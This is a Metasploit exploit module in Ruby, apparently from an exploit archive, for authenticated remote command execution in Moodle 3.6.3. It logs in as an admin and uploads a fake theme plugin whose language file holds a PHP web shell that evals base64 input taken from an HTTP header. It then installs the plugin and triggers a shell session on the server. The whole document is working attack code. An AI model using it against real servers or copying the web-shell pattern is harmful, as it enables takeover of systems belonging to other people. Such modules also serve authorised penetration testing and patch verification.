# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => "Moodle 3.6.3 - &#039;Install Plugin&#039; Remote Command Execution",
      &#039;Description&#039; => %q(
        This module exploits a command execution vulnerability in Moodle 3.6.3.
        An attacker can upload malicious file using the plugin installation area.
        Plugins must be hosted accommodate "version.php" and "theme_{plugin name}.php" files.
        After routine check, the moodle will accept the appropriate plugin file.
        Plugin control can be bypassed and malicious code can be placed in the files contained in the plugin.
        The module receives a shell session from the server by placing malicious code in the language file.

        You must have an admin account to exploit this vulnerability.
      ),
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; =>
        [
          &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Discovery & PoC & Metasploit module @ehakkus
        ],
      &#039;References&#039; =>
        [
          [&#039;URL&#039;, &#039;http://pentest.com.tr/exploits/Moodle-3-6-3-Install-Plugin-Remote-Command-Execution.html&#039;],
          [&#039;URL&#039;, &#039;https://moodle.org&#039;]
        ],
      &#039;Platform&#039; => &#039;php&#039;,
      &#039;Arch&#039; => ARCH_PHP,
      &#039;Targets&#039; => [[&#039;Automatic&#039;, {}]],
      &#039;Privileged&#039; => false,
      &#039;DisclosureDate&#039; => "Apr 28 2019",
      &#039;DefaultTarget&#039; => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, "Base Moodle directory path", &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, "Admin username to authenticate with", &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [false, "Admin password to authenticate with", &#039;admin&#039;])
      ]
    )
  end

  def create_plugin_file
    # There are syntax errors in creating zip file. So the payload was sent as base64.
    plugin_file      = Rex::Zip::Archive.new
    @header       = Rex::Text.rand_text_alpha_upper(4)
    @plugin_name  = Rex::Text.rand_text_alpha_lower(7)

    path = "#{@plugin_name}/version.php"
    path2 = "#{@plugin_name}/lang/en/theme_#{@plugin_name}.php"
    # "$plugin->version" and "$plugin->component" contents are required to accept Moodle plugin.
    plugin_file.add_file(path, "<?php $plugin->version = 2018121704; $plugin->component = &#039;theme_#{@plugin_name}&#039;;")
    plugin_file.add_file(path2, "<?php eval(base64_decode($_SERVER[&#039;HTTP_#{@header}&#039;])); ?>")
    plugin_file.pack

  end

  def exec_code(cookie)
    handler
    # Base64 was encoded in "PHP". This process was sent as "HTTP headers".
    send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => cookie,
      &#039;uri&#039; => normalize_uri(target_uri.path, "theme", @plugin_name, "lang", "en", "theme_#{@plugin_name}.php"),
      &#039;raw_headers&#039; => "#{@header}: #{Rex::Text.encode_base64(payload.encoded)}\r\n"
    })

  end

  def upload(cookie)
    # The beginning of the adventure o_O
    print_status("Plugin zip file is being created and loaded...")
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => cookie,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;tool&#039;, &#039;installaddon&#039;, &#039;index.php&#039;)
    )

    @sesskey = res.body.split(&#039;"sesskey":"&#039;)[1].split(&#039;"&#039;)[0] # fetch session info
    @itemid = res.body.split(&#039;amp;itemid=&#039;)[1].split(&#039;&&#039;)[0] # fetch item for upload
    @author = res.body.split(&#039;title="View profile">&#039;)[1].split(&#039;<&#039;)[0] # fetch admin account profile info
    @clientid = res.body.split(&#039;client_id":"&#039;)[1].split(&#039;"&#039;)[0] # fetch client info
    
    # creating multipart data for the upload plugin file
    pdata = Rex::MIME::Message.new
    pdata.add_part(create_plugin_file, &#039;application/zip&#039;, nil, "form-data; name=\"repo_upload_file\"; filename=\"#{@plugin_name}.zip\"")
    pdata.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="title"&#039;)
    pdata.add_part(@author, nil, nil, &#039;form-data; name="author"&#039;)
    pdata.add_part(&#039;allrightsreserved&#039;, nil, nil, &#039;form-data; name="license"&#039;)
    pdata.add_part(@itemid, nil, nil, &#039;form-data; name="itemid"&#039;)
    pdata.add_part(&#039;.zip&#039;, nil, nil, &#039;form-data; name="accepted_types[]"&#039;)
    pdata.add_part(&#039;4&#039;, nil, nil, &#039;form-data; name="repo_id"&#039;)
    pdata.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="p"&#039;)
    pdata.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="page"&#039;)
    pdata.add_part(&#039;filepicker&#039;, nil, nil, &#039;form-data; name="env"&#039;)
    pdata.add_part(@sesskey, nil, nil, &#039;form-data; name="sesskey"&#039;)
    pdata.add_part(@clientid, nil, nil, &#039;form-data; name="client_id"&#039;)
    pdata.add_part(&#039;-1&#039;, nil, nil, &#039;form-data; name="maxbytes"&#039;)
    pdata.add_part(&#039;-1&#039;, nil, nil, &#039;form-data; name="areamaxbytes"&#039;)
    pdata.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="ctx_id"&#039;)
    pdata.add_part(&#039;/&#039;, nil, nil, &#039;form-data; name="savepath"&#039;)
    data = pdata.to_s
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,    
      &#039;data&#039;  => data,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{pdata.bound}",
      &#039;cookie&#039; => cookie,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;repository&#039;, &#039;repository_ajax.php?action=upload&#039;)     
    })

    if res.body =~ /draftfile.php/
      print_good("Plugin #{@plugin_name}.zip file successfully uploaded to target!")
      print_status("Attempting to integrate the plugin...")
      @zipfile = res.body.split(&#039;draft\/&#039;)[1].split(&#039;\/&#039;)[0]
      plugin_integration(cookie)
    else
      fail_with(Failure::NoAccess, "Something went wrong!")
    end
  end

  def plugin_integration(cookie)

    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;tool&#039;, &#039;installaddon&#039;, &#039;index.php&#039;),
      &#039;cookie&#039;   => cookie,
      &#039;vars_post&#039; => {
        &#039;sesskey&#039; => @sesskey,
        &#039;_qf__tool_installaddon_installfromzip_form&#039; => &#039;1&#039;,
        &#039;mform_showmore_id_general&#039; => &#039;0&#039;,
        &#039;mform_isexpanded_id_general&#039; => &#039;1&#039;,
        &#039;zipfile&#039; => @zipfile,
        &#039;plugintype&#039; => &#039;theme&#039;,
        &#039;rootdir&#039; => &#039;&#039;,
        &#039;submitbutton&#039; => &#039;Install+plugin+from+the+ZIP+file&#039;
      }
    )

    if res.body =~ /installzipstorage/
      print_good("Plugin successfully integrated!")
      storage = res.body.split(&#039;installzipstorage=&#039;)[1].split(&#039;&&#039;)[0]

      res = send_request_cgi(
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;tool&#039;, &#039;installaddon&#039;, &#039;index.php&#039;),
        &#039;cookie&#039;   => cookie,
        &#039;vars_post&#039; => {
          &#039;installzipcomponent&#039; => "theme_#{@plugin_name}",
          &#039;installzipstorage&#039; => storage,
          &#039;installzipconfirm&#039; => &#039;1&#039;,
          &#039;sesskey&#039; => @sesskey
        }
      )
      exec_code(cookie)

    else
      fail_with(Failure::NoAccess, "Something went wrong!")
    end
  end
 
  def login(uname, pass)
    # 1st request to get MoodleSession and LoginToken
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;login&#039;, &#039;index.php&#039;)
    )
    cookie = res.get_cookies
    token = res.body.split(&#039;logintoken" value="&#039;)[1].split(&#039;"&#039;)[0]

    # 2nd request to login validation
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;login&#039;, &#039;index.php&#039;),
      &#039;cookie&#039;   => cookie,
      &#039;vars_post&#039; => {
        &#039;anchor&#039; => &#039;&#039;,
        &#039;logintoken&#039; => token,
        &#039;username&#039; => uname,
        &#039;password&#039; => pass
      }
    )

    cookie = res.get_cookies
    location = res.redirection.to_s
    if res and res.code = 303 && location.include?(&#039;testsession&#039;)
      return cookie     
    end 

    fail_with(Failure::NoAccess, "Authentication was unsuccessful with user: #{uname}")
    return nil
  end

  def check 
    # Basic check 
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;lib&#039;, &#039;upgrade.txt&#039;)
    )

    if res && res.code == 200 && res.body =~ /=== 3.7/
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Appears
    end 
  end
 
  def exploit
    cookie = login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
    print_good("Authentication was successful with user: #{datastore[&#039;USERNAME&#039;]}")
    upload(cookie) # start the adventure
  end
##
# The end of the adventure (o_O) // AkkuS
##
end

